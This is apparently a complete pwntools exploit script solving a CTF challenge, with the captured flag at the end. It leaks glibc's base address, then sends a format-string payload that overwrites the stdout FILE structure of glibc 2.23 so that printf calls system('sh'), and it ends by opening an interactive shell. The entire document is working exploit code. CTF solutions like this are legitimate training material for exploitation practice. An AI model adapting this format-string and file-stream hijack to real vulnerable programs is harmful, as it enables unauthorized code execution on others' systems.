from pwn import *

context.arch = 'amd64'
context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']

p = process('./app_patched')
gdb.attach(p, '''
    b *0x400889
    continue
''')

# p = remote('challenges.ctf.sd', 33749)

# this challenge applies a low version of glibc, which is available for low level fsop with minimal restrictions
glibc_e = ELF('./libc-2.23.so')

# 1. get glibc base address
p.recvuntil(b"[+] Clue: ")
glibc_base_addr = int(p.recvline().strip(), 16)-glibc_e.symbols['_IO_2_1_stdout_']
log.info(f"glibc base address: {hex(glibc_base_addr)}")

# 2. modify stdout with fmtstr to trigger fsop
# execution flow of modified stdout: printf -> vfprintf -> buffered_vfprintf
payload = fmtstr_payload(offset=8, writes={
    glibc_base_addr+glibc_e.symbols['_IO_2_1_stdout_']: b'sh;',
    glibc_base_addr+glibc_e.symbols['_IO_2_1_stdout_']+0x68: ((glibc_base_addr+glibc_e.sym.system)&0xffffff).to_bytes(3, 'little'),  # <buffered_vfprintf+0x131>   call   QWORD PTR [rax + 0x38]
    glibc_base_addr+glibc_e.symbols['_IO_2_1_stdout_']+0xd8: p16((glibc_base_addr+glibc_e.symbols['_IO_2_1_stdout_']+0x68-0x38)&0xffff)  # <buffered_vfprintf+0x124>   mov    rax, QWORD PTR [rbx+0xd8]
}, no_dollars=True)
p.sendlineafter(b"Write your path:\n", payload)

p.interactive()

# 0xL4ugh{Z0R0_F1N4LLY_F0UND_TH3_FM7_P47H_58bf9cc15d73b400}